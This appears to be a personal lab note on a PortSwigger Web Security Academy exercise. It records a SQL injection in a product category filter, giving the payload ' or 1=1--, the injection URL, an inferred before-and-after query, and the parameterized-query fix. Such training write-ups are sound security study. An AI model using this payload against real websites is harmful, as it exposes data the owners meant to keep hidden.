# SQLi Lab 1: WHERE clause, hidden data retrieval

**Platform:** PortSwigger Web Security Academy | **Level:** Apprentice | **Status:** Solved (TODO: date)

- **Vuln:** SQL injection in the product category filter
- **Injection point:** `category` parameter filter?category=Accessories'+OR+1=1--
- **Payload:** `' or 1=1--` (sent URL-encoded as `'+or+1=1--`)
- **Result:** the response included unreleased products that are normally hidden
- **Why it works (inferred, the backend query isn't visible):**
  - Query before: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
  - Query after: `SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1`
  - The `'` closes the string, `or 1=1` makes the condition always true, and `--` comments out the rest, including `released = 1`, so the filter that hides unreleased products no longer applies.
- **Fix:** parameterized queries (prepared statements)
- **Tools:** manual payload crafting : browser url bar
